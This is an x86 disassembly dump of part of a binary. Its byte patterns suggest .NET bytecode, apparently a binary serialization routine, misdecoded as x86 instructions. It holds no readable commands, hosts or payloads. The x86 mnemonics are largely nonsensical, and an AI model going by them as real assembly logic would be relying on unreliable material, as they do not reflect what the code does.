  4046f2:	11 04 7b             	adc    %eax,(%ebx,%edi,2)
  4046f5:	34 00                	xor    $0x0,%al
  4046f7:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4046fa:	ed                   	in     (%dx),%eax
  4046fb:	00 00                	add    %al,(%eax)
  4046fd:	0a 39                	or     (%ecx),%bh
  4046ff:	07                   	pop    %es
  404700:	00 00                	add    %al,(%eax)
  404702:	00 06                	add    %al,(%esi)
  404704:	0b dd                	or     %ebp,%ebx
  404706:	1c 00                	sbb    $0x0,%al
  404708:	00 00                	add    %al,(%eax)
  40470a:	12 03                	adc    (%ebx),%al
  40470c:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  404712:	d1 dd                	rcr    $1,%ebp
  404714:	0e                   	push   %cs
  404715:	00 00                	add    %al,(%eax)
  404717:	00 12                	add    %dl,(%edx)
  404719:	03 fe                	add    %esi,%edi
  40471b:	16                   	push   %ss
  40471c:	04 00                	add    $0x0,%al
  40471e:	00 1b                	add    %bl,(%ebx)
  404720:	6f                   	outsl  %ds:(%esi),(%dx)
  404721:	33 00                	xor    (%eax),%eax
  404723:	00 0a                	add    %cl,(%edx)
  404725:	dc 07                	faddl  (%edi)
  404727:	2a 01                	sub    (%ecx),%al
  404729:	10 00                	adc    %al,(%eax)
  40472b:	00 02                	add    %al,(%edx)
  40472d:	00 17                	add    %dl,(%edi)
  40472f:	00 39                	add    %bh,(%ecx)
  404731:	50                   	push   %eax
  404732:	00 0e                	add    %cl,(%esi)
  404734:	00 00                	add    %al,(%eax)
  404736:	00 00                	add    %al,(%eax)
  404738:	13 30                	adc    (%eax),%esi
  40473a:	02 00                	add    (%eax),%al
  40473c:	1e                   	push   %ds
  40473d:	00 00                	add    %al,(%eax)
  40473f:	00 01                	add    %al,(%ecx)
  404741:	00 00                	add    %al,(%eax)
  404743:	11 02                	adc    %eax,(%edx)
  404745:	03 28                	add    (%eax),%ebp
  404747:	6d                   	insl   (%dx),%es:(%edi)
  404748:	00 00                	add    %al,(%eax)
  40474a:	06                   	push   %es
  40474b:	0a 06                	or     (%esi),%al
  40474d:	15 40 02 00 00       	adc    $0x240,%eax
  404752:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  404755:	02 7b 38             	add    0x38(%ebx),%bh
  404758:	00 00                	add    %al,(%eax)
  40475a:	04 06                	add    $0x6,%al
  40475c:	6f                   	outsl  %ds:(%esi),(%dx)
  40475d:	ea 00 00 0a 2a 00 00 	ljmp   $0x0,$0x2a0a0000
  404764:	13 30                	adc    (%eax),%esi
  404766:	04 00                	add    $0x0,%al
  404768:	bc 00 00 00 1f       	mov    $0x1f000000,%esp
  40476d:	00 00                	add    %al,(%eax)
  40476f:	11 02                	adc    %eax,(%edx)
  404771:	7b 38                	jnp    0x4047ab
  404773:	00 00                	add    %al,(%eax)
  404775:	04 6f                	add    $0x6f,%al
  404777:	eb 00                	jmp    0x404779
  404779:	00 0a                	add    %cl,(%edx)
  40477b:	0a 06                	or     (%esi),%al
  40477d:	1f                   	pop    %ds
  40477e:	0f 3d                	(bad)
  404780:	16                   	push   %ss
  404781:	00 00                	add    %al,(%eax)
  404783:	00 20                	add    %ah,(%eax)
  404785:	80 00 00             	addb   $0x0,(%eax)
  404788:	00 06                	add    %al,(%esi)
  40478a:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  40478d:	0b 03                	or     (%ebx),%eax
  40478f:	07                   	pop    %es
  404790:	6f                   	outsl  %ds:(%esi),(%dx)
  404791:	ee                   	out    %al,(%dx)
  404792:	00 00                	add    %al,(%eax)
  404794:	0a 38                	or     (%eax),%bh
  404796:	59                   	pop    %ecx
  404797:	00 00                	add    %al,(%eax)
  404799:	00 06                	add    %al,(%esi)
  40479b:	20 ff                	and    %bh,%bh
  40479d:	ff 00                	incl   (%eax)
  40479f:	00 3d 2a 00 00 00    	add    %bh,0x2a
  4047a5:	20 de                	and    %bl,%dh
  4047a7:	00 00                	add    %al,(%eax)
  4047a9:	00 0b                	add    %cl,(%ebx)
  4047ab:	03 07                	add    (%edi),%eax
  4047ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4047ae:	ee                   	out    %al,(%dx)
  4047af:	00 00                	add    %al,(%eax)
  4047b1:	0a 06                	or     (%esi),%al
  4047b3:	68 28 ef 00 00       	push   $0xef28
  4047b8:	0a 28                	or     (%eax),%ch
  4047ba:	58                   	pop    %eax
  4047bb:	00 00                	add    %al,(%eax)
  4047bd:	06                   	push   %es
  4047be:	0c 03                	or     $0x3,%al
  4047c0:	08 16                	or     %dl,(%esi)
  4047c2:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047c8:	00 0a                	add    %cl,(%edx)
  4047ca:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  4047cd:	00 00                	add    %al,(%eax)
  4047cf:	20 df                	and    %bl,%bh
  4047d1:	00 00                	add    %al,(%eax)
  4047d3:	00 0b                	add    %cl,(%ebx)
  4047d5:	03 07                	add    (%edi),%eax
  4047d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4047d8:	ee                   	out    %al,(%dx)
  4047d9:	00 00                	add    %al,(%eax)
  4047db:	0a 06                	or     (%esi),%al
  4047dd:	28 4a 00             	sub    %cl,0x0(%edx)
  4047e0:	00 0a                	add    %cl,(%edx)
  4047e2:	28 58 00             	sub    %bl,0x0(%eax)
  4047e5:	00 06                	add    %al,(%esi)
  4047e7:	0c 03                	or     $0x3,%al
  4047e9:	08 16                	or     %dl,(%esi)
  4047eb:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047f1:	00 0a                	add    %cl,(%edx)
  4047f3:	16                   	push   %ss
  4047f4:	0d 38 2d 00 00       	or     $0x2d38,%eax
  4047f9:	00 03                	add    %al,(%ebx)
  4047fb:	02 7b 38             	add    0x38(%ebx),%bh
  4047fe:	00 00                	add    %al,(%eax)
  404800:	04 09                	add    $0x9,%al
  404802:	6f                   	outsl  %ds:(%esi),(%dx)
  404803:	ea 00 00 0a 7b 33 00 	ljmp   $0x33,$0x7b0a0000
  40480a:	00 04 28             	add    %al,(%eax,%ebp,1)
  40480d:	9a 00 00 06 02 7b 38 	lcall  $0x387b,$0x2060000
  404814:	00 00                	add    %al,(%eax)
  404816:	04 09                	add    $0x9,%al
  404818:	6f                   	outsl  %ds:(%esi),(%dx)
  404819:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  404820:	00 00                	add    %al,(%eax)
  404822:	06                   	push   %es
  404823:	09 17                	or     %edx,(%edi)
  404825:	58                   	pop    %eax
  404826:	0d 09 06 32 cf       	or     $0xcf320609,%eax
  40482b:	2a 13                	sub    (%ebx),%dl
  40482d:	30 04 00             	xor    %al,(%eax,%eax,1)
  404830:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404831:	00 00                	add    %al,(%eax)
  404833:	00 1f                	add    %bl,(%edi)
  404835:	00 00                	add    %al,(%eax)
  404837:	11 02                	adc    %eax,(%edx)
  404839:	7b 38                	jnp    0x404873
  40483b:	00 00                	add    %al,(%eax)
  40483d:	04 6f                	add    $0x6f,%al
  40483f:	eb 00                	jmp    0x404841
  404841:	00 0a                	add    %cl,(%edx)
  404843:	0a 06                	or     (%esi),%al
  404845:	1f                   	pop    %ds
  404846:	0f 3d                	(bad)
  404848:	16                   	push   %ss
  404849:	00 00                	add    %al,(%eax)
  40484b:	00 20                	add    %ah,(%eax)
  40484d:	90                   	nop
  40484e:	00 00                	add    %al,(%eax)
  404850:	00 06                	add    %al,(%esi)
  404852:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  404855:	0b 03                	or     (%ebx),%eax
  404857:	07                   	pop    %es
  404858:	6f                   	outsl  %ds:(%esi),(%dx)
  404859:	ee                   	out    %al,(%dx)
  40485a:	00 00                	add    %al,(%eax)
  40485c:	0a 38                	or     (%eax),%bh
  40485e:	59                   	pop    %ecx
  40485f:	00 00                	add    %al,(%eax)
  404861:	00 06                	add    %al,(%esi)
  404863:	20 ff                	and    %bh,%bh
  404865:	ff 00                	incl   (%eax)
  404867:	00 3d 2a 00 00 00    	add    %bh,0x2a
  40486d:	20 dc                	and    %bl,%ah
  40486f:	00 00                	add    %al,(%eax)
  404871:	00 0b                	add    %cl,(%ebx)
  404873:	03 07                	add    (%edi),%eax
  404875:	6f                   	outsl  %ds:(%esi),(%dx)
  404876:	ee                   	out    %al,(%dx)
  404877:	00 00                	add    %al,(%eax)
  404879:	0a 06                	or     (%esi),%al
  40487b:	68 28 ef 00 00       	push   $0xef28
  404880:	0a 28                	or     (%eax),%ch
  404882:	58                   	pop    %eax
  404883:	00 00                	add    %al,(%eax)
  404885:	06                   	push   %es
  404886:	0c 03                	or     $0x3,%al
  404888:	08 16                	or     %dl,(%esi)
  40488a:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  404890:	00 0a                	add    %cl,(%edx)
  404892:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  404895:	00 00                	add    %al,(%eax)
  404897:	20 dd                	and    %bl,%ch
  404899:	00 00                	add    %al,(%eax)
  40489b:	00 0b                	add    %cl,(%ebx)
  40489d:	03 07                	add    (%edi),%eax
  40489f:	6f                   	outsl  %ds:(%esi),(%dx)
  4048a0:	ee                   	out    %al,(%dx)
  4048a1:	00 00                	add    %al,(%eax)
  4048a3:	0a 06                	or     (%esi),%al
  4048a5:	28 4a 00             	sub    %cl,0x0(%edx)
  4048a8:	00 0a                	add    %cl,(%edx)
  4048aa:	28 58 00             	sub    %bl,0x0(%eax)
  4048ad:	00 06                	add    %al,(%esi)
  4048af:	0c 03                	or     $0x3,%al
  4048b1:	08 16                	or     %dl,(%esi)
  4048b3:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4048b9:	00 0a                	add    %cl,(%edx)
  4048bb:	16                   	push   %ss
  4048bc:	0d 38 16 00 00       	or     $0x1638,%eax
  4048c1:	00 02                	add    %al,(%edx)
  4048c3:	7b 38                	jnp    0x4048fd
  4048c5:	00 00                	add    %al,(%eax)
  4048c7:	04 09                	add    $0x9,%al
  4048c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4048ca:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  4048d1:	00 00                	add    %al,(%eax)
  4048d3:	06                   	push   %es
  4048d4:	09 17                	or     %edx,(%edi)
  4048d6:	58                   	pop    %eax
  4048d7:	0d 09 06 32 e6       	or     $0xe6320609,%eax
  4048dc:	2a 00                	sub    (%eax),%al
  4048de:	00 00                	add    %al,(%eax)
  4048e0:	13 30                	adc    (%eax),%esi
  4048e2:	02 00                	add    (%eax),%al
  4048e4:	99                   	cltd
  4048e5:	00 00                	add    %al,(%eax)
  4048e7:	00 20                	add    %ah,(%eax)
  4048e9:	00 00                	add    %al,(%eax)
  4048eb:	11 02                	adc    %eax,(%edx)
  4048ed:	7b 36                	jnp    0x404925
  4048ef:	00 00                	add    %al,(%eax)
  4048f1:	04 0a                	add    $0xa,%al
  4048f3:	06                   	push   %es
  4048f4:	1a 59 45             	sbb    0x45(%ecx),%bl
  4048f7:	07                   	pop    %es
  4048f8:	00 00                	add    %al,(%eax)
  4048fa:	00 22                	add    %ah,(%edx)
  4048fc:	00 00                	add    %al,(%eax)
  4048fe:	00 05 00 00 00 16    	add    %al,0x16000000
  404904:	00 00                	add    %al,(%eax)
  404906:	00 6b 00             	add    %ch,0x0(%ebx)
  404909:	00 00                	add    %al,(%eax)
  40490b:	38 00                	cmp    %al,(%eax)
  40490d:	00 00                	add    %al,(%eax)
  40490f:	49                   	dec    %ecx
  404910:	00 00                	add    %al,(%eax)
  404912:	00 5a 00             	add    %bl,0x0(%edx)
  404915:	00 00                	add    %al,(%eax)
  404917:	38 66 00             	cmp    %ah,0x0(%esi)
  40491a:	00 00                	add    %al,(%eax)
  40491c:	02 7b 35             	add    0x35(%ebx),%bh
  40491f:	00 00                	add    %al,(%eax)
  404921:	04 a5                	add    $0xa5,%al
  404923:	68 00 00 01 28       	push   $0x28010000
  404928:	f0 00 00             	lock add %al,(%eax)
  40492b:	0a 2a                	or     (%edx),%ch
  40492d:	02 7b 35             	add    0x35(%ebx),%bh
  404930:	00 00                	add    %al,(%eax)
  404932:	04 a5                	add    $0xa5,%al
  404934:	95                   	xchg   %eax,%ebp
  404935:	00 00                	add    %al,(%eax)
  404937:	01 2a                	add    %ebp,(%edx)
  404939:	02 7b 35             	add    0x35(%ebx),%bh
  40493c:	00 00                	add    %al,(%eax)
  40493e:	04 6f                	add    $0x6f,%al
  404940:	38 00                	cmp    %al,(%eax)
  404942:	00 0a                	add    %cl,(%edx)
  404944:	6f                   	outsl  %ds:(%esi),(%dx)
  404945:	f1                   	int1
  404946:	00 00                	add    %al,(%eax)
  404948:	0a 28                	or     (%eax),%ch
  40494a:	f2 00 00             	repnz add %al,(%eax)
  40494d:	0a 2a                	or     (%edx),%ch
  40494f:	02 7b 35             	add    0x35(%ebx),%bh
  404952:	00 00                	add    %al,(%eax)
  404954:	04 a5                	add    $0xa5,%al
  404956:	96                   	xchg   %eax,%esi
  404957:	00 00                	add    %al,(%eax)
  404959:	01 28                	add    %ebp,(%eax)
  40495b:	f3 00 00             	repz add %al,(%eax)
  40495e:	0a 2a                	or     (%edx),%ch
  404960:	02 7b 35             	add    0x35(%ebx),%bh
  404963:	00 00                	add    %al,(%eax)
  404965:	04 a5                	add    $0xa5,%al
  404967:	97                   	xchg   %eax,%edi
  404968:	00 00                	add    %al,(%eax)
  40496a:	01 28                	add    %ebp,(%eax)
  40496c:	f4                   	hlt
  40496d:	00 00                	add    %al,(%eax)
  40496f:	0a 2a                	or     (%edx),%ch
  404971:	02 7b 35             	add    0x35(%ebx),%bh
  404974:	00 00                	add    %al,(%eax)
  404976:	04 a5                	add    $0xa5,%al
  404978:	6b 00 00             	imul   $0x0,(%eax),%eax
  40497b:	01 28                	add    %ebp,(%eax)
  40497d:	f5                   	cmc
  40497e:	00 00                	add    %al,(%eax)
  404980:	0a 2a                	or     (%edx),%ch
  404982:	16                   	push   %ss
  404983:	6a 2a                	push   $0x2a
  404985:	00 00                	add    %al,(%eax)
  404987:	00 13                	add    %dl,(%ebx)
  404989:	30 02                	xor    %al,(%edx)
  40498b:	00 99 00 00 00 20    	add    %bl,0x20000000(%ecx)
  404991:	00 00                	add    %al,(%eax)
  404993:	11 02                	adc    %eax,(%edx)
  404995:	7b 36                	jnp    0x4049cd
  404997:	00 00                	add    %al,(%eax)
  404999:	04 0a                	add    $0xa,%al
  40499b:	06                   	push   %es
  40499c:	1a 59 45             	sbb    0x45(%ecx),%bl
  40499f:	07                   	pop    %es
  4049a0:	00 00                	add    %al,(%eax)
  4049a2:	00 22                	add    %ah,(%edx)
  4049a4:	00 00                	add    %al,(%eax)
  4049a6:	00 05 00 00 00 11    	add    %al,0x11000000
  4049ac:	00 00                	add    %al,(%eax)
  4049ae:	00 6b 00             	add    %ch,0x0(%ebx)
  4049b1:	00 00                	add    %al,(%eax)
  4049b3:	38 00                	cmp    %al,(%eax)
  4049b5:	00 00                	add    %al,(%eax)
  4049b7:	49                   	dec    %ecx
  4049b8:	00 00                	add    %al,(%eax)
  4049ba:	00 5a 00             	add    %bl,0x0(%edx)
  4049bd:	00 00                	add    %al,(%eax)
  4049bf:	38 66 00             	cmp    %ah,0x0(%esi)
  4049c2:	00 00                	add    %al,(%eax)
  4049c4:	02 7b 35             	add    0x35(%ebx),%bh
  4049c7:	00 00                	add    %al,(%eax)
  4049c9:	04 a5                	add    $0xa5,%al
  4049cb:	68 00 00 01 2a       	push   $0x2a010000
  4049d0:	02 7b 35             	add    0x35(%ebx),%bh
  4049d3:	00 00                	add    %al,(%eax)
  4049d5:	04 a5                	add    $0xa5,%al
  4049d7:	68 00 00 01 28       	push   $0x28010000
  4049dc:	f6 00 00             	testb  $0x0,(%eax)
  4049df:	0a 2a                	or     (%edx),%ch
  4049e1:	02 7b 35             	add    0x35(%ebx),%bh
  4049e4:	00 00                	add    %al,(%eax)
  4049e6:	04 6f                	add    $0x6f,%al
  4049e8:	38 00                	cmp    %al,(%eax)
  4049ea:	00 0a                	add    %cl,(%edx)
  4049ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4049ed:	f1                   	int1
  4049ee:	00 00                	add    %al,(%eax)
  4049f0:	0a 28                	or     (%eax),%ch
  4049f2:	f7 00 00 0a 2a 02    	testl  $0x22a0a00,(%eax)
  4049f8:	7b 35                	jnp    0x404a2f
  4049fa:	00 00                	add    %al,(%eax)
  4049fc:	04 a5                	add    $0xa5,%al
  4049fe:	96                   	xchg   %eax,%esi
  4049ff:	00 00                	add    %al,(%eax)
  404a01:	01 28                	add    %ebp,(%eax)
  404a03:	f8                   	clc
  404a04:	00 00                	add    %al,(%eax)
  404a06:	0a 2a                	or     (%edx),%ch
  404a08:	02 7b 35             	add    0x35(%ebx),%bh
  404a0b:	00 00                	add    %al,(%eax)
  404a0d:	04 a5                	add    $0xa5,%al
  404a0f:	97                   	xchg   %eax,%edi
  404a10:	00 00                	add    %al,(%eax)
  404a12:	01 28                	add    %ebp,(%eax)
  404a14:	f9                   	stc
  404a15:	00 00                	add    %al,(%eax)
  404a17:	0a 2a                	or     (%edx),%ch
  404a19:	02 7b 35             	add    0x35(%ebx),%bh
  404a1c:	00 00                	add    %al,(%eax)
  404a1e:	04 a5                	add    $0xa5,%al
  404a20:	6b 00 00             	imul   $0x0,(%eax),%eax
  404a23:	01 28                	add    %ebp,(%eax)
  404a25:	fa                   	cli
  404a26:	00 00                	add    %al,(%eax)
  404a28:	0a 2a                	or     (%edx),%ch
  404a2a:	16                   	push   %ss
  404a2b:	6a 2a                	push   $0x2a
  404a2d:	00 00                	add    %al,(%eax)
  404a2f:	00 13                	add    %dl,(%ebx)
  404a31:	30 02                	xor    %al,(%edx)
  404a33:	00 87 00 00 00 20    	add    %al,0x20000000(%edi)
  404a39:	00 00                	add    %al,(%eax)
  404a3b:	11 02                	adc    %eax,(%edx)
  404a3d:	7b 36                	jnp    0x404a75
  404a3f:	00 00                	add    %al,(%eax)
  404a41:	04 0a                	add    $0xa,%al
  404a43:	06                   	push   %es
  404a44:	1a 59 45             	sbb    0x45(%ecx),%bl
  404a47:	07                   	pop    %es
  404a48:	00 00                	add    %al,(%eax)
  404a4a:	00 16                	add    %dl,(%esi)
  404a4c:	00 00                	add    %al,(%eax)
  404a4e:	00 05 00 00 00 52    	add    %al,0x52000000
  404a54:	00 00                	add    %al,(%eax)
  404a56:	00 52 00             	add    %dl,0x0(%edx)
  404a59:	00 00                	add    %al,(%eax)
  404a5b:	27                   	daa
  404a5c:	00 00                	add    %al,(%eax)
  404a5e:	00 33                	add    %dh,(%ebx)
  404a60:	00 00                	add    %al,(%eax)
  404a62:	00 40 00             	add    %al,0x0(%eax)
  404a65:	00 00                	add    %al,(%eax)
  404a67:	38 4d 00             	cmp    %cl,0x0(%ebp)
  404a6a:	00 00                	add    %al,(%eax)
  404a6c:	02 7b 35             	add    0x35(%ebx),%bh
  404a6f:	00 00                	add    %al,(%eax)
  404a71:	04 a5                	add    $0xa5,%al
  404a73:	68 00 00 01 28       	push   $0x28010000
  404a78:	fb                   	sti
  404a79:	00 00                	add    %al,(%eax)
  404a7b:	0a 2a                	or     (%edx),%ch
  404a7d:	02 7b 35             	add    0x35(%ebx),%bh
  404a80:	00 00                	add    %al,(%eax)
  404a82:	04 74                	add    $0x74,%al
  404a84:	38 00                	cmp    %al,(%eax)
  404a86:	00 01                	add    %al,(%ecx)
  404a88:	28 fc                	sub    %bh,%ah
  404a8a:	00 00                	add    %al,(%eax)
  404a8c:	0a 2a                	or     (%edx),%ch
  404a8e:	02 7b 35             	add    0x35(%ebx),%bh
  404a91:	00 00                	add    %al,(%eax)
  404a93:	04 a5                	add    $0xa5,%al
  404a95:	96                   	xchg   %eax,%esi
  404a96:	00 00                	add    %al,(%eax)
  404a98:	01 2a                	add    %ebp,(%edx)
  404a9a:	02 7b 35             	add    0x35(%ebx),%bh
  404a9d:	00 00                	add    %al,(%eax)
  404a9f:	04 a5                	add    $0xa5,%al
  404aa1:	97                   	xchg   %eax,%edi
  404aa2:	00 00                	add    %al,(%eax)
  404aa4:	01 6c 2a 02          	add    %ebp,0x2(%edx,%ebp,1)
  404aa8:	7b 35                	jnp    0x404adf
  404aaa:	00 00                	add    %al,(%eax)
  404aac:	04 a5                	add    $0xa5,%al
  404aae:	6b 00 00             	imul   $0x0,(%eax),%eax
  404ab1:	01 28                	add    %ebp,(%eax)
  404ab3:	fa                   	cli
  404ab4:	00 00                	add    %al,(%eax)
  404ab6:	0a 6c 2a 23          	or     0x23(%edx,%ebp,1),%ch
	...
  404ac2:	2a 00                	sub    (%eax),%al
  404ac4:	13 30                	adc    (%eax),%esi
  404ac6:	02 00                	add    (%eax),%al
  404ac8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404ac9:	00 00                	add    %al,(%eax)
  404acb:	00 21                	add    %ah,(%ecx)
  404acd:	00 00                	add    %al,(%eax)
  404acf:	11 02                	adc    %eax,(%edx)
  404ad1:	7b 36                	jnp    0x404b09
  404ad3:	00 00                	add    %al,(%eax)
  404ad5:	04 0a                	add    $0xa,%al
  404ad7:	06                   	push   %es
  404ad8:	1a 59 45             	sbb    0x45(%ecx),%bl
  404adb:	08 00                	or     %al,(%eax)
  404add:	00 00                	add    %al,(%eax)
  404adf:	16                   	push   %ss
  404ae0:	00 00                	add    %al,(%eax)
  404ae2:	00 05 00 00 00 6e    	add    %al,0x6e000000
  404ae8:	00 00                	add    %al,(%eax)
  404aea:	00 6e 00             	add    %ch,0x0(%esi)
  404aed:	00 00                	add    %al,(%eax)
  404aef:	27                   	daa
  404af0:	00 00                	add    %al,(%eax)
  404af2:	00 38                	add    %bh,(%eax)
  404af4:	00 00                	add    %al,(%eax)
  404af6:	00 49 00             	add    %cl,0x0(%ecx)
  404af9:	00 00                	add    %al,(%eax)
  404afb:	62 00                	bound  %eax,(%eax)
  404afd:	00 00                	add    %al,(%eax)
  404aff:	38 69 00             	cmp    %ch,0x0(%ecx)
  404b02:	00 00                	add    %al,(%eax)
  404b04:	02 7b 35             	add    0x35(%ebx),%bh
  404b07:	00 00                	add    %al,(%eax)
  404b09:	04 a5                	add    $0xa5,%al
  404b0b:	68 00 00 01 28       	push   $0x28010000
  404b10:	e7 00                	out    %eax,$0x0
  404b12:	00 0a                	add    %cl,(%edx)
  404b14:	2a 02                	sub    (%edx),%al
  404b16:	7b 35                	jnp    0x404b4d
  404b18:	00 00                	add    %al,(%eax)
  404b1a:	04 6f                	add    $0x6f,%al
  404b1c:	38 00                	cmp    %al,(%eax)
  404b1e:	00 0a                	add    %cl,(%edx)
  404b20:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  404b24:	06                   	push   %es
  404b25:	2a 02                	sub    (%edx),%al
  404b27:	7b 35                	jnp    0x404b5e
  404b29:	00 00                	add    %al,(%eax)
  404b2b:	04 a5                	add    $0xa5,%al
  404b2d:	96                   	xchg   %eax,%esi
  404b2e:	00 00                	add    %al,(%eax)
  404b30:	01 28                	add    %ebp,(%eax)
  404b32:	e8 00 00 0a 2a       	call   0x2a4a4b37
  404b37:	02 7b 35             	add    0x35(%ebx),%bh
  404b3a:	00 00                	add    %al,(%eax)
  404b3c:	04 a5                	add    $0xa5,%al
  404b3e:	97                   	xchg   %eax,%edi
  404b3f:	00 00                	add    %al,(%eax)
  404b41:	01 28                	add    %ebp,(%eax)
  404b43:	fd                   	std
  404b44:	00 00                	add    %al,(%eax)
  404b46:	0a 2a                	or     (%edx),%ch
  404b48:	02 7b 35             	add    0x35(%ebx),%bh
  404b4b:	00 00                	add    %al,(%eax)
  404b4d:	04 a5                	add    $0xa5,%al
  404b4f:	6b 00 00             	imul   $0x0,(%eax),%eax
  404b52:	01 0b                	add    %ecx,(%ebx)
  404b54:	12 01                	adc    (%ecx),%al
  404b56:	28 fe                	sub    %bh,%dh
  404b58:	00 00                	add    %al,(%eax)
  404b5a:	0a 28                	or     (%eax),%ch
  404b5c:	e7 00                	out    %eax,$0x0
  404b5e:	00 0a                	add    %cl,(%edx)
  404b60:	2a 02                	sub    (%edx),%al
  404b62:	7b 35                	jnp    0x404b99
  404b64:	00 00                	add    %al,(%eax)
  404b66:	04 74                	add    $0x74,%al
  404b68:	02 00                	add    (%eax),%al
  404b6a:	00 1b                	add    %bl,(%ebx)
  404b6c:	2a 16                	sub    (%esi),%dl
  404b6e:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404b72:	01 2a                	add    %ebp,(%edx)
  404b74:	13 30                	adc    (%eax),%esi
  404b76:	04 00                	add    $0x0,%al
  404b78:	4b                   	dec    %ebx
  404b79:	00 00                	add    %al,(%eax)
  404b7b:	00 22                	add    %ah,(%edx)
  404b7d:	00 00                	add    %al,(%eax)
  404b7f:	11 03                	adc    %eax,(%ebx)
  404b81:	28 6a 00             	sub    %ch,0x0(%edx)
  404b84:	00 0a                	add    %cl,(%edx)
  404b86:	39 3e                	cmp    %edi,(%esi)
  404b88:	00 00                	add    %al,(%eax)
  404b8a:	00 14 0a             	add    %dl,(%edx,%ecx,1)
  404b8d:	03 19                	add    (%ecx),%ebx
  404b8f:	17                   	pop    %ss
  404b90:	17                   	pop    %ss
  404b91:	73 ff                	jae    0x404b92
  404b93:	00 00                	add    %al,(%eax)
  404b95:	0a 0b                	or     (%ebx),%cl
  404b97:	07                   	pop    %es
  404b98:	6f                   	outsl  %ds:(%esi),(%dx)
  404b99:	e2 00                	loop   0x404b9b
  404b9b:	00 0a                	add    %cl,(%edx)
  404b9d:	d4 8d                	aam    $0x8d
  404b9f:	44                   	inc    %esp
  404ba0:	00 00                	add    %al,(%eax)
  404ba2:	01 0a                	add    %ecx,(%edx)
  404ba4:	07                   	pop    %es
  404ba5:	06                   	push   %es
  404ba6:	16                   	push   %ss
  404ba7:	07                   	pop    %es
  404ba8:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba9:	e2 00                	loop   0x404bab
  404bab:	00 0a                	add    %cl,(%edx)
  404bad:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  404bb4:	07                   	pop    %es
  404bb5:	6f                   	outsl  %ds:(%esi),(%dx)
  404bb6:	9f                   	lahf
  404bb7:	00 00                	add    %al,(%eax)
  404bb9:	0a 07                	or     (%edi),%al
  404bbb:	6f                   	outsl  %ds:(%esi),(%dx)
  404bbc:	40                   	inc    %eax
  404bbd:	00 00                	add    %al,(%eax)
  404bbf:	0a 02                	or     (%edx),%al
  404bc1:	06                   	push   %es
  404bc2:	28 79 00             	sub    %bh,0x0(%ecx)
  404bc5:	00 06                	add    %al,(%esi)
  404bc7:	17                   	pop    %ss
  404bc8:	2a 16                	sub    (%esi),%dl
  404bca:	2a 00                	sub    (%eax),%al
  404bcc:	13 30                	adc    (%eax),%esi
  404bce:	05 00 40 00 00       	add    $0x4000,%eax
  404bd3:	00 00                	add    %al,(%eax)
  404bd5:	00 00                	add    %al,(%eax)
  404bd7:	00 02                	add    %al,(%edx)
  404bd9:	7b 35                	jnp    0x404c10
  404bdb:	00 00                	add    %al,(%eax)
  404bdd:	04 39                	add    $0x39,%al
  404bdf:	33 00                	xor    (%eax),%eax
  404be1:	00 00                	add    %al,(%eax)
  404be3:	03 1c 73             	add    (%ebx,%esi,2),%ebx
  404be6:	6c                   	insb   (%dx),%es:(%edi)
  404be7:	00 00                	add    %al,(%eax)
  404be9:	0a 25 02 7b 35 00    	or     0x357b02,%ah
  404bef:	00 04 74             	add    %al,(%esp,%esi,2)
  404bf2:	02 00                	add    (%eax),%al
  404bf4:	00 1b                	add    %bl,(%ebx)
  404bf6:	16                   	push   %ss
  404bf7:	02 7b 35             	add    0x35(%ebx),%bh
  404bfa:	00 00                	add    %al,(%eax)
  404bfc:	04 74                	add    $0x74,%al
  404bfe:	02 00                	add    (%eax),%al
  404c00:	00 1b                	add    %bl,(%ebx)
  404c02:	8e 69 6f             	mov    0x6f(%ecx),%gs
  404c05:	4c                   	dec    %esp
  404c06:	00 00                	add    %al,(%eax)
  404c08:	0a 25 6f 9f 00 00    	or     0x9f6f,%ah
  404c0e:	0a 6f 40             	or     0x40(%edi),%ch
  404c11:	00 00                	add    %al,(%eax)
  404c13:	0a 17                	or     (%edi),%dl
  404c15:	2a 16                	sub    (%esi),%dl
  404c17:	2a 13                	sub    (%ebx),%dl
  404c19:	30 04 00             	xor    %al,(%eax,%eax,1)
  404c1c:	af                   	scas   %es:(%edi),%eax
  404c1d:	00 00                	add    %al,(%eax)
  404c1f:	00 23                	add    %ah,(%ebx)
  404c21:	00 00                	add    %al,(%eax)
  404c23:	11 02                	adc    %eax,(%edx)
  404c25:	0a 03                	or     (%ebx),%al
  404c27:	6f                   	outsl  %ds:(%esi),(%dx)
  404c28:	f1                   	int1
  404c29:	00 00                	add    %al,(%eax)
  404c2b:	0a 19                	or     (%ecx),%bl
  404c2d:	8d 39                	lea    (%ecx),%edi
  404c2f:	00 00                	add    %al,(%eax)
  404c31:	01 25 d0 47 00 00    	add    %esp,0x47d0
  404c37:	04 28                	add    $0x28,%al
  404c39:	e4 00                	in     $0x0,%al
  404c3b:	00 0a                	add    %cl,(%edx)
  404c3d:	6f                   	outsl  %ds:(%esi),(%dx)
  404c3e:	26 00 00             	add    %al,%es:(%eax)
  404c41:	0a 0b                	or     (%ebx),%cl
  404c43:	14 0c                	adc    $0xc,%al
  404c45:	07                   	pop    %es
  404c46:	8e 3a                	mov    (%edx),%?
  404c48:	02 00                	add    (%eax),%al
  404c4a:	00 00                	add    %al,(%eax)
  404c4c:	14 2a                	adc    $0x2a,%al
